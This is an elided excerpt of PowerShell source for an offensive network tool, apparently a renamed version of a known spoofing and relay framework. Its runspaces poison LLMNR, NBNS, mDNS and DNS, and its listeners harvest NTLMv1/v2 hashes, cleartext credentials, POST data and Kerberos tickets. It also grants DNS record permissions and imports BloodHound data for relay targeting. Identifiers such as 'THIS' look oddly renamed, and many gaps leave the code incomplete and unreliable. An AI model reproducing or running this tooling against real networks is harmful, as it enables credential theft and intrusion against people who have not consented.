        if($NBNSBruteForcePause -and $Innoc.hostname_spoof)
        {
         
            if($Innoc.NBNS_stopwatch.Elapsed -ge $NBNS_pause)
            {
                $Innoc.hostname_spoof = $false
            }
        ...
        if($RunCount)
        {
            ...
            if($Innoc.NTLMv1_list.Count -ge $run_count_NTLMv1 -or $Innoc.NTLMv2_list.Count -ge $run_count_NTLMv2 -or $Innoc.cleartext_list.Count -ge $run_count_cleartext)
            {
                Stop-InnocRunspace "reaching run count"           
            }
        ...
        if($RunTime)
        {
            ...
            {
                Stop-InnocRunspace "reaching run time"
            }

        }

        if($Innoc.THIS -contains 'Combo' -and $Innoc.request_table_updated)
        {
            
            try
            {
                Invoke-THISCheck -Credential $THISCredential -Data $SpooferIP -Domain $THISDomain -DomainController $THISDomainController -Forest $THISForest -Ignore $THISHostsIgnore -Partition $THISPartition -RequestTable $Innoc.request_table -Threshold $THISThreshold -TTL $THISTTL -Zone $THISZone
            }
            catch
            {
                $error_message = $_.Exception.Message
            ...
            $Innoc.request_table_updated = $false
        }

        if($Innoc.THIS -and $Innoc.THIS_table.Count -gt 0)
        {
            [Array]$THIS_table_keys_temp = $Innoc.THIS_table.Keys
            ...
            foreach($THIS_host in $THIS_table_keys_temp)
            {
                ...
                if($Innoc.THIS_table.$THIS_host -eq 1)
                {

                    try
                    {
                        Grant-THISPermission -Credential $THISCredential -Domain $THISDomain -DomainController $THISDomainController -Node $THIS_host -Principal 'Authenticated Users'-Zone $THISZone
                        $Innoc.THIS_table.$THIS_host = 2
                    }
                    catch
                    {
                        $error_message = $_.Exception.Message
                        $error_message = $error_message -replace "`n",""
                        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] THIS ACE add for host record for $THIS_host failed") > $null
                    }
        ...
        if($Innoc.file_output)
        {
            ...
            while($Innoc.log_file_queue.Count -gt 0)
            {
                $Innoc.log_file_queue[0]|Out-File $Innoc.log_out_file -Append
                $Innoc.log_file_queue.RemoveAt(0)
            }

            while($Innoc.NTLMv1_file_queue.Count -gt 0)
            {
                $Innoc.NTLMv1_file_queue[0]|Out-File $Innoc.NTLMv1_out_file -Append
                $Innoc.NTLMv1_file_queue.RemoveAt(0)
            }

            while($Innoc.NTLMv2_file_queue.Count -gt 0)
            {
                $Innoc.NTLMv2_file_queue[0]|Out-File $Innoc.NTLMv2_out_file -Append
                $Innoc.NTLMv2_file_queue.RemoveAt(0)
            }

            while($Innoc.cleartext_file_queue.Count -gt 0)
            {
                $Innoc.cleartext_file_queue[0]|Out-File $Innoc.cleartext_out_file -Append
                $Innoc.cleartext_file_queue.RemoveAt(0)
            }

            while($Innoc.POST_request_file_queue.Count -gt 0)
            {
                $Innoc.POST_request_file_queue[0]|Out-File $Innoc.POST_request_out_file -Append
                $Innoc.POST_request_file_queue.RemoveAt(0)
            }

        }

        if(!$Innoc.console_output -and $ConsoleQueueLimit -ge 0)
        {

            while($Innoc.console_queue.Count -gt $ConsoleQueueLimit -and !$Innoc.console_output)
            {
                $Innoc.console_queue.RemoveAt(0)
            }

        }

        if(!$Innoc.status_output)
        {
            Invoke-OutputQueueLoop
        }
...
function HTTPListener
{
    ...
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
...
function HTTPSListener
{
    ...
    $HTTPS_runspace.Open()
    $HTTPS_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
...
function ProxyListener
{
    ...
    $proxy_runspace.Open()
    $proxy_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
...
function SnifferSpoofer
{
    ...
    $sniffer_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
...
function DNSSpoofer
{
    ...
    $DNS_spoofer_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
...
function LLMNRSpoofer
{
    ...
    $LLMNR_spoofer_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
...
function mDNSSpoofer
{
    ...
    $mDNS_spoofer_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
...
function NBNSSpoofer
{
    ...
    $NBNS_spoofer_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
...
function NBNSBruteForceSpoofer
{
    ...
    $NBNS_bruteforce_spoofer_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
...
function ControlLoop
{
    ...
    $control_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
    ...
    $control_powershell.AddScript($THIS_functions_scriptblock) > $null
    $control_powershell.AddScript($control_scriptblock).AddArgument($THISACE).AddArgument(
        $THISCleanup).AddArgument($THISCredential).AddArgument($THISDomain).AddArgument(
        $THISDomainController).AddArgument($THISForest).AddArgument($THISHostsIgnore).AddArgument(
        $THISNS).AddArgument($THISNSTarget).AddArgument($THISPartition).AddArgument(
        $THISThreshold).AddArgument($THISTTL).AddArgument($THISZone).AddArgument(
...
try
{
    ...
    if($ConsoleOutput -ne 'N')
    {
        ...
        :console_loop while(($Innoc.running -and $Innoc.console_output) -or ($Innoc.console_queue.Count -gt 0 -and $Innoc.console_output))
        {
    
            while($Innoc.console_queue.Count -gt 0)
            {

                switch -wildcard ($Innoc.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {

                        if($Innoc.output_stream_only)
                        {
                            Write-Output($Innoc.console_queue[0] + $Innoc.newline)
                        }
                        else
                        {
                            Write-Warning($Innoc.console_queue[0])
                        }
                    ...
                    {$_ -like "* spoofer disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {
                        ...
                        if($ConsoleOutput -eq 'Y')
                        {
                            ...
                            {
                                Write-Output($Innoc.console_queue[0])
                            }
            ...
            if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)
            {
                ...
                if($Innoc.cleartext_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique cleartext captures:" + $Innoc.newline)
                    $Innoc.cleartext_list.Sort()
                    $cleartext_list_temp = $Innoc.cleartext_list
                    ...
                    foreach($unique_cleartext in $cleartext_list_temp)
                    {
                        ...
                        {
                            Write-Output($unique_cleartext + $Innoc.newline)
                        }
                ...
                {
                    Write-Output("[+] [$(Get-Date -format s)] No cleartext credentials have been captured" + $Innoc.newline)
                }

                if($Innoc.POST_request_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique POST request captures:" + $Innoc.newline)
                    $Innoc.POST_request_list.Sort()
                    $POST_request_list_temp = $Innoc.POST_request_list
                    ...
                    foreach($unique_POST_request in $POST_request_list_temp)
                    {
                        ...
                        {
                            Write-Output($unique_POST_request + $Innoc.newline)
                        }
                ...
                if($Innoc.NTLMv1_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:" + $Innoc.newline)
                    $Innoc.NTLMv1_list.Sort()
                    $NTLMv1_list_temp = $Innoc.NTLMv1_list
                    ...
                    foreach($unique_NTLMv1 in $NTLMv1_list_temp)
                    {
                        ...
                        {
                            Write-Output($unique_NTLMv1 + $Innoc.newline)
                        }
                    ...
                    Start-Sleep -m 5
                    Write-Output("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:" + $Innoc.newline)
                    $NTLMv1_username_list_temp = $Innoc.NTLMv1_username_list

                    foreach($NTLMv1_username in $NTLMv1_username_list_temp)
                    {
                        Write-Output($NTLMv1_username + $Innoc.newline)
                    }
                ...
                {
                    Write-Output("[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured" + $Innoc.newline)
                }

                if($Innoc.NTLMv2_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:" + $Innoc.newline)
                    $Innoc.NTLMv2_list.Sort()
                    $NTLMv2_list_temp = $Innoc.NTLMv2_list
                    ...
                    foreach($unique_NTLMv2 in $NTLMv2_list_temp)
                    {
                        ...
                        {
                            Write-Output($unique_NTLMv2 + $Innoc.newline)
                        }
                    ...
                    Start-Sleep -m 5
                    Write-Output("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:" + $Innoc.newline)
                    $NTLMv2_username_list_temp = $Innoc.NTLMv2_username_list

                    foreach($NTLMv2_username in $NTLMv2_username_list_temp)
                    {
                        Write-Output($NTLMv2_username + $Innoc.newline)
                    }
                
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured" + $Innoc.newline)
                }

                $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
            }

            if($Innoc.console_input)
            {
...
<#
.SYNOPSIS
Stop-Innoc will stop all running Innoc functions.
#>
    ...
    if($Innoc)
    {
        ...
        if($Innoc.running -or $Innoc.relay_running)
        {
            $Innoc.console_queue.Clear()
            Watch-Innoc -NoConsoleMessage
        }
        else
        {
            Write-Output "[-] There are no running Innoc functions"
        }
...
<#
.SYNOPSIS
Get-Innoc will get stored Innoc data from memory.
...
#>
    ...
    ( 
        ...
        [parameter(Mandatory=$false)][Switch]$THIS,
        [parameter(Mandatory=$false)][Switch]$THISFailed,
    ...
    if($THIS)
    {
        $THIS_table_keys_temp = $Innoc.THIS_table.Keys
    ...
    if($THISFailed)
    {
        ...
        foreach($THIS_host in $THIS_table_keys_temp)
        {
            ...
            if($Innoc.THIS_table.$THIS_host -eq 0)
            {
                Write-Output $THIS_host
            }
    ...
    if($KerberosTGT)
    {
        Write-Output $Innoc.kerberos_TGT_list[$KerberosTGT]
    }

    if($KerberosUsername)
    {
        Write-Output $Innoc.kerberos_TGT_username_list
    }

    if($Log)
    {
        Write-Output $Innoc.log
    }

    if($NTLMv1)
    {
        Write-Output $Innoc.NTLMv1_list
    }
    ...
    if($NTLMv1Usernames)
    {
        Write-Output $Innoc.NTLMv2_username_list
    }

    if($NTLMv2)
    {
        Write-Output $Innoc.NTLMv2_list
    }
    ...
    if($Cleartext)
    {
        Write-Output $Innoc.cleartext_list
    }

    if($CleartextUnique)
    {
        Write-Output $Innoc.cleartext_list | Get-Unique
    }

    if($POSTRequest)
    {
        Write-Output $Innoc.POST_request_list
    }

    if($POSTRequestUnique)
    {
        Write-Output $Innoc.POST_request_list | Get-Unique
    }

    if($Learning)
    {
        Write-Output $Innoc.valid_host_list
    }
    ...
    if($Session)
    {
        ...
        while($i -lt $Innoc.session_socket_table.Count)
        {

            if(!$Innoc.session_socket_table[$i].Connected)
            {
                $Innoc.session[$i] | Where-Object {$_.Status = "disconnected"}
            }
        
            $i++
        }

        Write-Output $Innoc.session | Format-Table -AutoSize
    }

    if($Enumerate)
    {
        Write-Output $Innoc.enumerate
    }

}

function Watch-Innoc
{
<#
.SYNOPSIS
Watch-Innoc will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.
...
if($Innoc.tool -ne 1)
{
    ...
    if($Innoc.running -or $Innoc.relay_running)
    {
        ...
        :console_loop while((($Innoc.running -or $Innoc.relay_running) -and $Innoc.console_output) -or ($Innoc.console_queue.Count -gt 0 -and $Innoc.console_output))
        {
    ...
    {
        Write-Output "[-] Innoc isn't running"
    }

}
else
{
    Write-Output "[-] Watch-Innoc cannot be used with current external tool selection"
}

}

function Clear-Innoc
{
<#
.SYNOPSIS
Clear-Innoc will clear Innoc data from memory.
#>

if($Innoc)
{

    if(!$Innoc.running -and !$Innoc.relay_running)
    {
        Remove-Variable Innoc -scope global
        Write-Output "[+] Innoc data has been cleared from memory"
    }
    else
    {
        Write-Output "[-] Run Stop-Innoc before running Clear-Innoc"
    }
...
function ConvertTo-Innoc
{
    <#
    .SYNOPSIS
    ConvertTo-Innoc imports Bloodhound computers, groups and session JSON files into $Innoc.enumerate
    for Innoc Relay targeting.

    .DESCRIPTION
    For the fastest import, import the data before gather any enumeration data with Innoc.
    ...
    if($Innoc.running -or $Innoc.relay_running)
    {
        Write-Output "Run Stop-Innoc before importing data with ConvertTo-Innoc"
        throw
    }
    ...
    {       
        ...
        Write-Output "[*] Importing computers to Innoc"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0
        ...
        $bloodhound_computers.Computers | ForEach-Object {
            ...
            if(!$enumerate_empty)
            {
                ...
                for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
                {
                    ...
                    if(($hostname -and $Innoc.enumerate[$i].Hostname -eq $hostname) -or ($IP -and $Innoc.enumerate[$i].IP -eq $IP))
                    {

                        if($Innoc.enumerate[$i].Hostname -ne $hostname -and $Innoc.enumerate[$i].IP -eq $IP)
                        {

                            for($j = 0;$j -lt $Innoc.enumerate.Count;$j++)
                            {

                                if($Innoc.enumerate[$j].IP -eq $target)
                                {
                                    $target_index = $j
                                    break
                                }
                            ...
                            $Innoc.enumerate[$target_index].Hostname = $hostname
                        }
                        else
                        {
                            ...
                            for($j = 0;$j -lt $Innoc.enumerate.Count;$j++)
                            {
                                ...
                                if($Innoc.enumerate[$j].Hostname -eq $hostname)
                                {
                                    $target_index = $j
                                    break
                                }
                        ...
                        $Innoc.enumerate[$target_index]."Administrator Users" = $local_admin_users
                        $Innoc.enumerate[$target_index]."Administrator Groups" = $local_admin_groups
                    }
                    else
                    {
                        $Innoc.enumerate.Add((New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups)) > $null
                    }
    ...
    if($Sessions)
    {
        ...
        $stopwatch_parse.Reset()
        $stopwatch_parse.Start()
        Write-Output "[*] Importing sessions to Innoc"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0
        ...
        $bloodhound_sessions.Sessions | ForEach-Object {
            ...
            if($hostname -as [IPAddress] -as [Bool])
            {
                ...
                for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
                {
                    ...
                    if($Innoc.enumerate[$i].IP -eq $target)
                    {
                        $target_index = $i
                        break
                    }
            ...
            else
            {
                for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
                {
                    ...
                    if($Innoc.enumerate[$i].Hostname -eq $hostname)
                    {
                        $target_index = $i
                        break
                    }
            ...
            {
                [Array]$session_list = $Innoc.enumerate[$target_index].Sessions

                if($session_list -notcontains $_.UserName)
                {
                    $session_list += $_.UserName
                    $Innoc.enumerate[$target_index].Sessions = $session_list
                }

            }
            else
            {   
                $Innoc.enumerate.Add($(New-RelayEnumObject -Hostname $hostname -IP $IP -Sessions $_.UserName)) > $null
            }
    ...
    if($Groups)
    {
        ...
        $stopwatch_parse.Reset()
        $stopwatch_parse.Start()
        Write-Output "[*] Importing groups to Innoc"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0
        ...
        $bloodhound_groups.Groups | ForEach-Object {
            ...
            $Innoc.group_table.Add($_.Name,$group_members)
            $group_members = $null
            $i++
        }
